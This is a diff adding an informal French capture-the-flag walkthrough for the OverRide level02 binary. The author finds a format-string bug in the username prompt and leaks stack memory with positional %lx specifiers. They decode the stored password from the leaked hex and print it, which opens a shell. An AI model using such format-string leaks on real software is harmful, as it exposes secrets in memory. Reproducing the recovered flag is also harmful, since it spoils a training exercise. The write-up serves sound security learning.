@@ -1,0 +1,72 @@
+on start par la base ltrace on trouve rien de fou
+je gdb et aussi je scp sur mon pc pour voir ce qu'il a dans le ventre ce code
+
+on a ca qui est pas mal
+
+  if (iVar1 == 0) {
+    printf("Greetings, %s!\n",local_78);
+    system("/bin/sh");
+    return 0;
+  }
+
+mais avent ca il y a pas mal de print qu'on peut exploit on va tester 
+level02@OverRide:~$ ./level02
+===== [ Secure Access System v1.0 ] =====
+/***************************************\
+| You must login to access this system. |
+\**************************************/
+--[ Username: %x %x %x
+--[ Password: aaaaaaaaaaaa
+*****************************************
+ffffe500 0 61 does not have access!
+
+bon ok on peut bien exploit je vais regarder se que je peux en faire
+
+on a ca aussi
+undefined8 local_118 [14];	//str mdp
+undefined8 local_a8 [6];	//pour le str file
+undefined8 local_78 [12];	//str username
+
+du coup nous on veut trouver le str file on voit qu'il est entre le local 118 et le 78
+le local 118 fait 14 buf + 8 (j'avais trouver ca dans des video pour snow crash je pense)
+
+donc il faut que je %lx les 6 donnee que contien str file
+je l'envoi donc dans local 118 qui et le write user
+
+14 + 8 = 22
+--[ Username: %22$lx %23$lx %24$lx %25$lx %26$lx %27$lx %28$lx
+--[ Password: bleu
+*****************************************
+756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d 0 2520786c24323225 does not have access!
+
+on voit une separation avec le 0 j'ai du mal faire un truc donc j'ai lu un peu trop loin 
+du coup ca c notre mdp mais c trop long du coup je vais sur 
+
+https://www.dcode.fr/identification-chiffrement et je copie mon "mdp"
+le premier c chiffre base 32 j'ai essayer c nul
+mais le second c ascii et la ca me parle j'obtien ca
+HEX /2	unPR47hHEAJ5as9Q7zqCWNgX5J5hnGXsH3gPfK9M
+
+et j'y pense l'hex faut le reverse a chaque foi 
+ca donne ca
+M9KfPg3HsXGnh5J5XgNWCqz7Q9sa5JAEHh74RPnu
+
+ok ca marche pas je vais reverse les chiffre je sens que c ca
+
+756e505234376848 45414a3561733951 377a7143574e6758 354a35686e475873 48336750664b394d
+
+si vous voulez gouter a l'enfer separer comme moi 2 par deux et reversais les voila ce que ca donne 
+
+|4868373452506e75|51397361354a4145|58674e5743717a37|7358476e68354a35|4d394b6650673348|
+
+et on re decode avec l option ascii
+
+↑↓	↑↓
+HEX /2	Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+
+LET'S GO
+
+--[ Username: bleu 
+--[ Password: Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
+*****************************************
+Greetings, bleu!
